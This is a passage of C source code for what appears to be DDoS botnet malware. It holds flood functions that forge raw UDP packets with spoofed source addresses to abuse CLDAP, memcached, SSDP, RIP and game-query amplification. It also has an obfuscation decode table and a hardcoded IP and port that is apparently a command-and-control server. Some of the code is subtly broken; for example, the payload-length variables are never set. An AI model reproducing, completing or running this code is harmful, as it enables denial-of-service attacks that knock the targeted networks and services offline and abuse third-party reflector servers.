\\x347\\x34d\\x326\\x347\\x353\\x321\\x35a\\x353\\x6b\\x337\\x30e\\x30e\\x35d\\x342\\x310\\x301\\x308\\x302\\x352\\x341\\x30f\\x32f\\x32d\\x333\\x330\\x330\\x347\\x35a\\x339\\x318\\x33a\\x33a\\x316\\x64\\x336\\x344\\x302\\x310\\x340\\x352\\x349\\x31f\\x339\\x325\\x339\\x316\\x356\\x359\\x321\\x329\\x356\\x73\\x338\\x304\\x311\\x31b\\x33e\\x332\\x34e\\x31d\\x355\\x31f\\x31e\\x328\\x326\\x316\\x355\\x61\\x336\\x33d\\x33e\\x30d",
            "\\x334\\x30f\\x33e\\x308\\x341\\x351\\x309\\x309\\x309\\x304\\x31b\\x31a\\x35c\\x34e\\x32e\\x354\\x330\\x332\\x31f\\x320\\x339\\x31d\\x66\\x335\\x305\\x31e\\x345\\x331\\x331\\x320\\x347\\x330\\x323\\x347\\x31c\\x317\\x31d\\x331\\x319\\x73\\x338\\x35b\\x31a\\x31b\\x360\\x35b\\x33e\\x352\\x306\\x302\\x350\\x30b\\x352\\x344\\x323\\x349\\x31d\\x356\\x320\\x31c\\x328\\x353\\x333\\x323\\x332\\x6c\\x334\\x303\\x300\\x301\\x341\\x344\\x310\\x34b\\x30d\\x324\\x6b\\x335\\x35d\\x357\\x31b\\x35d\\x302\\x351\\x319\\x34d\\x326\\x345\\x32d\\x330\\x32e\\x320\\x328\\x324\\x339\\x333\\x61\\x335\\x34c\\x32a\\x331\\x359\\x31d\\x35a\\x35a\\x318\\x33c\\x325\\x333\\x332\\x328\\x33b\\x31f\\x68\\x334\\x358\\x308\\x303\\x31b\\x31b\\x341\\x35b\\x344\\x33a\\x66\\x335\\x341\\x310\\x35d\\x313\\x32a\\x331\\x330\\x326\\x66\\x334\\x304\\x350\\x30f\\x33d\\x308\\x300\\x340\\x312\\x305\\x33e\\x33f\\x314\\x342\\x332\\x330\\x324\\x354\\x323\\x329\\x323\\x31c\\x61\\x334\\x30a\\x331\\x325\\x32c\\x332\\x316\\x32b\\x356\\x355\\x33c\\x317\\x32f\\x32e\\x66\\x334\\x34c\\x313\\x33f\\x34e\\x356\\x355\\x328\\x323\\x347\\x35c\\x64\\x337\\x311\\x306\\x301\\x358\\x307\\x349\\x325\\x321\\x2c\\x336\\x35b\\x32d\\x345\\x319\\x332\\x332\\x32c\\x34d\\x356\\x325\\x329\\x33b\\x73\\x336\\x352\\x342\\x33e\\x342\\x352\\x343\\x31d\\x32b\\x319\\x32e\\x318\\x359\\x33a\\x327\\x73\\x337\\x35d\\x308\\x34b\\x346\\x311\\x306\\x33e\\x358\\x30d\\x30a\\x308\\x319\\x32f\\x327\\x33a\\x31e\\x35a\\x32f\\x320\\x333\\x6b\\x335\\x35b\\x31a\\x315\\x343\\x300\\x350\\x34c\\x303\\x32a\\x35a\\x320\\x359\\x35c\\x35a\\x353\\x317\\x356\\x319\\x356\\x32c\\x32e\\x64\\x336\\x344\\x306\\x300\\x34c\\x309\\x30e\\x350\\x30c\\x343\\x350\\x30f\\x314\\x30f\\x34a\\x30a\\x345\\x31f\\x34d\\x349\\x31d\\x32f\\x339\\x33a\\x73\\x337\\x305\\x310\\x30d\\x306\\x312\\x302\\x300\\x31a\\x341\\x34a\\x319\\x359\\x328\\x32b\\x324\\x355\\x330\\x61\\x335\\x306\\x304\\x343\\x30d\\x358\\x30b\\x303\\x344\\x30c\\x31e\\x67\\x337\\x30a\\x351\\x31a\\x309\\x315\\x304\\x35b\\x330\\x66\\x335\\x306\\x341\\x30a\\x314\\x308\\x360\\x360\\x32e\\x349\\x349\\x347\\x331\\x"
         
         };
        if (a >= 50){
            hexstring = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
            send(std_hex, hexstring, std_packets, 0);
            connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs)
            {
                close(std_hex);
                _exit(0);
            }
            a = 0;
        }
        a++;
    }
}
char encodes[] = { 
    //skiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiid
    '%', 'q', '*', 'K', 'C', ')', '&', 'F', '9', '8', 'f', 's', 'r', '2', 't', 'o', '4', 'b', '3', 'y', 'i', '_', ':', 'w', 'B', '>', 'z', '=', ';', '!', 'k', '?', '"', 'E', 'A', 'Z', '7', '.', 'D', '-', 'm', 'd', '<', 'e', 'x', '5', 'U', '~', 'h', ',', 'j', '|', '$', 'v', '6', 'c', '1', 'g', 'a', '+', 'p', '@', 'u', 'n'
    
};
char decodes[] = { 
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
    'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
    'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
    'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '.', ' '
};
char decoded[512];

char *decode(char *str)
{
    int x = 0, i = 0, c;

    memset(decoded, 0, sizeof(decoded));
    while(x < strlen(str))
    {
        for(c = 0; c <= sizeof(encodes); c++)
        {
            if(str[x] == encodes[c])
            {
                decoded[i] = decodes[c];
                i++;
            }
        }
        x++;
    }
    decoded[i] = '\0';

    return decoded;
}
unsigned char *agagag[] = {"143.198.120.58:888"};
void makecldappacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){ //AMP
    char *cldap_payload;
    int cldap_payload_len;
    cldap_payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", &cldap_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + cldap_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void cldapattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *cldap_payload;
    int cldap_payload_len;
    cldap_payload = "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00", &cldap_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makecldappacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + cldap_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + cldap_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + cldap_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makemempacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *mem_payload;
    int mem_payload_len;
    mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a", &mem_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + mem_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void memattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *mem_payload;
    int mem_payload_len;
    mem_payload = "\x00\x01\x00\x00\x00\x01\x00\x00\x73\x74\x61\x74\x73\x0d\x0a", &mem_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makemempacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + mem_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + mem_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + mem_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makentppacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *ntp_payload;
    int ntp_payload_len;
    ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a", &ntp_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + ntp_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void ntpattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *ntp_payload;
    int ntp_payload_len;
    ntp_payload = "\x4d\x2d\x53\x45\x41\x52\x43\x48\x20\x2a\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x0d\x0a\x48\x6f\x73\x74\x3a\x32\x33\x39\x2e\x32\x35\x35\x2e\x32\x35\x35\x2e\x32\x35\x30\x3a\x31\x39\x30\x30\x0d\x0a\x53\x54\x3a\x73\x73\x64\x70\x3a\x61\x6c\x6c\x0d\x0a\x4d\x61\x6e\x3a\x22\x73\x73\x64\x70\x3a\x64\x69\x73\x63\x6f\x76\x65\x72\x22\x0d\x0a\x4d\x58\x3a\x33\x0d\x0a\x0d\x0a", &ntp_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makentppacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + ntp_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + ntp_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + ntp_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makerippacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *rip_payload;
    int rip_payload_len;
    rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10", &rip_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + rip_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void ripattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *rip_payload;
    int rip_payload_len;
    rip_payload = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10", &rip_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makerippacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + rip_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + rip_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + rip_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makextdpacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *xtd_payload;
    int xtd_payload_len;
    xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",&xtd_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + xtd_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void xtdattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *xtd_payload;
    int xtd_payload_len;
    xtd_payload = "8d\xc1x\x01\xb8\x9b\xcb\x8f\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\01k\xc1x\x02\x8b\x9e\xcd\x8e\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",&xtd_payload_len;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister;
    pollRegister = pollinterval;
    if(spoofit == 32){
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
        if(buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            if(i == pollRegister){
                if(port == 0) dest_addr.sin_port = rand_cmwc();
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
    else{
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if(!sockfd){
            return;
        }
        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){
            return;
        }
        int counter = 50;
        while(counter--){
            srand(time(NULL) ^ rand_cmwc());
            
        }
        in_addr_t netmask;
        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );
        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        makextdpacket(iph, dest_addr.sin_addr.s_addr, htonl( findRandIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);
        udph->len = htons(sizeof(struct udphdr) + packetsize + xtd_payload_len);
        udph->source = rand_cmwc();
        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
        udph->check = 0;
        udph->check = checksum_tcp_udp(iph, udph, udph->len, sizeof (struct udphdr) + sizeof (uint32_t) + xtd_payload_len);
        makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);
        iph->check = csum ((unsigned short *) packet, iph->tot_len);
        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while(1){
            sendto(sockfd, packet, sizeof (struct iphdr) + sizeof (struct udphdr) + sizeof (uint32_t) + xtd_payload_len, sizeof(packet), (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            udph->source = rand_cmwc();
            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
            iph->id = rand_cmwc();
            iph->saddr = htonl( findRandIP(netmask) );
            iph->check = csum ((unsigned short *) packet, iph->tot_len);
            if(i == pollRegister){
                if(time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if(ii == sleepcheck){
                usleep(sleeptime*1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}
void makevsepacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize){
    char *vse_payload;
    int vse_payload_len;
    vse_payload = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79", &vse_payload_len;
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize + vse_payload_len;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}
void vseattack(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime){
    char *vse_payload;
    int vse_payload_len;
